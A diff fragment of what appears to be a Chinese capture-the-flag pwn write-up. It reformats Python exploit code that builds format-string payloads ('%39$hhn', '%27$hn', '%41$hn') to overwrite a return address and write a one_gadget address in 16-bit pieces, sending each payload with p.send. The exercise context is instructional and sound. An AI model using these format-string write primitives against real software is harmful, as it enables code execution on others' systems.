-'c%39$hhn'
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
+payload=b'%'+str((value-0xc)).encode()+b'c%11$hn'
+payload+=b'%'+str(0x100023-((value-0xc))).encode()+b'c%39$hhn'
+payload=payload.ljust(0x100,b'\x00')
 ```
 
 >
@@ -2894,69 +563,10 @@ b
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-(((
-value
--
-4
-))
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%27$hn'
-
-#0x15，写ogg的地方
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str(((value-4))-0x23).encode()+b'c%27$hn' #0x15，写ogg的地方
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 >
@@ -2965,69 +575,10 @@ payload
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-((
-one_gadget
-&
-0xffff
-)
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%41$hn'
-
-#0x23，写入ogg
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str((one_gadget&0xffff)-0x23).encode()+b'c%41$hn' #0x23，写入ogg
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 >
@@ -3036,71 +587,10 @@ payload
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-(((
-value
--
-4
-+
-2
-))
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%27$hn'
-
-#0x15，写ogg的地方
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str(((value-4+2))-0x23).encode()+b'c%27$hn' #0x15，写ogg的地方
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 >
@@ -3109,72 +599,10 @@ payload
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-(((
-one_gadget
->>
-16
-)
-&
-0xffff
-)
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%41$hn'
-
-#0x23，写入ogg
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str(((one_gadget>>16)&0xffff)-0x23).encode()+b'c%41$hn' #0x23，写入ogg
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 >
@@ -3183,73 +611,10 @@ payload
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-(((
-value
--
-4
-+
-2
-+
-2
-))
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%27$hn'
-
-#0x15，写ogg的地方
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str(((value-4+2+2))-0x23).encode()+b'c%27$hn' #0x15，写ogg的地方
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 >
@@ -3258,116 +623,19 @@ payload
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0x23
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-#0x21，改返回地址
-
-payload
-+=
-b
-'%'
-+
-str
-(((
-one_gadget
->>
-32
-)
-&
-0xffff
-)
--
-0x23
-)
-.
-encode
-()
-+
-b
-'c%41$hn'
-
-#0x23，写入ogg
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0x23).encode()+b'c%39$hhn' #0x21，改返回地址
+payload+=b'%'+str(((one_gadget>>32)&0xffff)-0x23).encode()+b'c%41$hn' #0x23，写入ogg
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 最终改写返回地址，也就是把指针给挪一下
 
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-(
-0xc4
-)
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
+payload=b'%'+str(0xc4).encode()+b'c%39$hhn'
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
 ```
 
 
@@ -3377,25 +645,5 @@ payload
 
 
 ```
-
-payload
-
-=
-
-b
-'%
-{}
-c'
-.
-format
-(
-x
-)
-.
-encode
-()
-+
-b
-'%k$n'
-
+payload = b'%{}c'.format(x).encode()+b'%k$n'
 ```
